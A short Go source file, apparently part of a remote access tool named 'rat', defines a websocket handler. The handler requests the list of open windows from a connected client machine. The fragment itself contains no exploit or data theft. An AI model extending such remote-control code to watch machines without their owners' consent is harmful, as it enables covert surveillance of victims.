package main

import (
	"rat/shared"
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type WindowMessage []shared.Window

func (m WindowMessage) Header() MessageHeader {
	return Windows
}

func (d WindowMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	client.Listeners[header.WindowsHeader] = ws
	client.Queue <- &WindowsPacket{}

	return nil
}
